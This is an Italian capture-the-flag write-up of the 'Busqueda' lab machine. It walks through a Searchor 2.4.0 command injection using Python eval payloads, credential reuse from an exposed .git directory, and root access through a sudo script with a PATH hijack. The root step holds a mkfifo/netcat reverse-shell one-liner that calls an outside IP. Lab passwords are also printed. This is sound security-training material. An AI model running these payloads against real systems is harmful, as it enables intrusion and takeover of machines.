+++
date = '2026-06-24T17:21:51+02:00'
draft = false
title = 'Busqueda Writeup IT'
+++
**Nome**: **`joy.scd01`**

**Data**: **`05/02/2025`**

![Busqueda.jpeg](/images/imgs_busqueda/Busqueda.jpeg)

---
# Introduzione

**_Busqueda_** è una macchina **Linux** di livello **Easy** che mette in luce alcune vulnerabilità classiche e molto realistiche, concentrandosi specificamente su **Arbitrary Command Injection** e **Path Hijacking**.

L'accesso iniziale si ottiene enumerando l'applicazione web e sfruttando una nota vulnerabilità di **command injection** in una versione obsoleta di **Searchor**.

La privilege escalation richiede una solida enumerazione: prima individuando dei **metadati Git** esposti che portano al **riutilizzo delle credenziali**, e infine ottenendo un'escalation verticale a **root** abusando di uno **script Python eseguibile tramite sudo**. Questo script esegue a sua volta uno script bash senza specificarne il percorso assoluto, aprendo le porte a una classica tecnica di **path hijack**.

---
# Tecniche Utilizzate
- **Arbitrary Command Injection → RCE**

- **Information Disclosure → Metadati Git**

- **Riutilizzo delle credenziali**

- **Misconfigurazione di Sudo → Path Hijacking**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV -T4 busqueda
```

![nmap.png](/images/imgs_busqueda/nmap.png)

**Porte Aperte**:
- **22**/tcp - SSH

- **80**/tcp - HTTP

La scansione **nmap** ha anche rivelato un nuovo sottodominio, **`searcher.htb`**, che ho subito aggiunto al mio file **`/etc/hosts`** per accedere all'applicazione web.

## HTTP - Enumerazione Web    

Navigando su **`searcher.htb`**, mi sono trovato davanti una semplice istanza di **Searchor**. Guardando in fondo alla pagina, ho subito notato il numero di versione: **2.4.0**.

Dopo una rapida ricerca su Google per le CVE relative a questa versione specifica, ho trovato un exploit pubblico:
https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

La vulnerabilità sfrutta la funzione **`eval()`** utilizzata all'interno del file **`src/searchor/main.py`**. Poiché l'input dell'utente viene passato in modo non sicuro, è possibile eseguire codice arbitrario utilizzando funzioni **Python** come:
```python
__import__('os').system('<CMD>')

__import__('os').popen('<CMD>').read()
```

Era esattamente ciò di cui avevo bisogno per ottenere il mio accesso iniziale.

---
# Accesso Iniziale | Arbitrary Command Injection → RCE

Ho scaricato lo script dell'exploit e ho preparato il mio listener **netcat**:

```bash
nc -lvnp 9001
```

Poi, ho eseguito lo script **bash** contro il target:

```bash
./exploit.sh searcher.htb <attacker_ip>
```

![exploit1.png](/images/imgs_busqueda/exploit1.png)

Subito dopo l'esecuzione, ho ottenuto una reverse shell come utente **svc**.

![shellsvc1.png](/images/imgs_busqueda/shellsvc1.png)

All'interno di **`/home/svc`**, ho trovato la **user flag**.

---
# Privilege Escalation | Sudo Misconfiguration → Path Hijacking

Con una shell sulla macchina, ho iniziato a esplorare directory e file per tracciare un percorso di escalation.

## Stabilizzazione della Shell & Directory .git Nascosta

Cercando i file di configurazione dell'app in **`/var/www/app`**, ho notato una directory nascosta **`.git`**. Scavandoci, ho trovato alcune informazioni estremamente succulente:

1. **`/.git/config`**:

![config.png](/images/imgs_busqueda/config.png)

Questo file ha fatto trapelare un set di credenziali: **`cody:jh1usoih2bkjaspwe92`** e ha anche rivelato un altro sottodominio: **`gitea.searcher.htb`**.

2. **`/.git/logs/HEAD`**:

![admin.png](/images/imgs_busqueda/admin.png)

Questo file di log ha rivelato l'esistenza di un altro utente, **administrator**, anch'esso correlato all'istanza **Gitea**.

All'inizio, ho provato ad accedere alla web app **Gitea** come **cody** con la password appena scoperta, ma è stato un buco nell'acqua.

A questo punto, la mia reverse shell era ancora piuttosto instabile, rendendo l'enumerazione noiosa e lenta. Dato che avevo una password e una porta **SSH** attiva, ho deciso di tentare con il **riutilizzo delle credenziali**.

Ho semplicemente provato ad accedere via **SSH** con il mio utente attuale (**svc**) usando la password di **cody** (**jh1usoih2bkjaspwe92**).

Ha funzionato, e ho finalmente ottenuto una sessione **SSH** stabile e completamente interattiva.

## Misconfigurazione di Sudo

Con una shell adeguata e una password valida, la primissima cosa da controllare è sempre:

```bash
sudo -l
```

![sudol.png](/images/imgs_busqueda/sudol.png)

L'output mostrava che l'utente **svc** poteva eseguire uno specifico script **Python** come **root**:
```bash
/usr/bin/python3 /opt/scripts/system-checkup.py *
```

Ho eseguito lo script per capire cosa facesse. Offriva 3 azioni:

1. **`docker-ps`**: Elenca tutti i container Docker in esecuzione.

![firstd.png](/images/imgs_busqueda/firstd.png)

2. **`docker-inspect`**: Richiede un formato e il nome di un container.

Dopo vari tentativi (e qualche ricerca su Google sulla formattazione di Docker), sono riuscito a estrarre l'oggetto JSON contenente la configurazione dei container.

![cont1.png](/images/imgs_busqueda/cont1.png)

Ispezionando il secondo container:

![cont2.png](/images/imgs_busqueda/cont2.png)

Sono state rivelate due ulteriori password:
- **jI86kGUuj87guWr3RyF**
- **yuiu1hoiu4i5ho1uh**

Usando la seconda password, ho effettuato l'accesso alla web app **Gitea** come **administrator**, dove ho trovato alcuni script.

3. **`full-checkup`**:
Controllando come **`system-checkup.py`** gestiva l'argomento **`full-checkup`**, ho notato un'enorme falla. Lo script Python chiamava uno script bash chiamato **`full-checkup.sh`** senza specificarne il percorso assoluto.

![vuln.png](/images/imgs_busqueda/vuln.png)


**Nota**: _Questa è una classica vulnerabilità di **Path Hijacking**. Poiché il percorso assoluto non è definito, il sistema cercherà **`full-checkup.sh`** in qualsiasi directory attualmente elencata nella variabile d'ambiente **PATH**, partendo dalla directory corrente se configurato in tal senso._

## Path Hijacking → root

Per sfruttare questa vulnerabilità, mi è bastato creare uno script malevolo chiamato **`full-checkup.sh`** in una directory sotto il mio controllo (come **`/tmp`**), scriverci dentro una reverse shell ed eseguire il comando sudo da lì.

**PrivEsc Workflow**:

```bash
# 1. Creazione del payload malevolo in /tmp:
svc@busqueda:/tmp$ nano full-checkup.sh  
  
#!/bin/bash  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.15 22667 >/tmp/f

------------------------------------------------------------------------

# 2. Reso eseguibile il file:
svc@busqueda:/tmp$ chmod +x full-checkup.sh

------------------------------------------------------------------------

# 3. Avviato un nuovo listener netcat sulla mia macchina:
nc -lvnp 22667

------------------------------------------------------------------------

# 4. Innesco dell'exploit eseguendo il comando sudo:
svc@busqueda:/tmp$ sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Controllando il mio listener, ho ottenuto una shell di root.

La **root flag** si trovava all'interno di **`/root`**.

![root.png](/images/imgs_busqueda/root.png)

---
# Conclusioni Finali

**_Busqueda_** è una fantastica macchina di livello **Easy** che concatena scenari molto realistici.

La **command injection** iniziale è molto semplice, ma è un ottimo promemoria per controllare sempre i numeri di versione del software in esecuzione sui server web target. Passando alla privilege escalation, trovare la directory **`.git`**, contenente password e sottodomini, è una bella **information disclosure** realistica, che ha portato fluidamente al **riutilizzo delle credenziali**.

Infine, il vettore di **path hijacking** è una classica tecnica di privilege escalation su Linux. Ottima, perché ti costringe a leggere il codice degli script che sei autorizzato a eseguire con sudo e a comprendere esattamente come stanno richiamando i comandi di sistema sottostanti.

**Fonti**:

- **Searchor 2.4.0 Exploit | (Arbitrary CMD Injection)** | https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
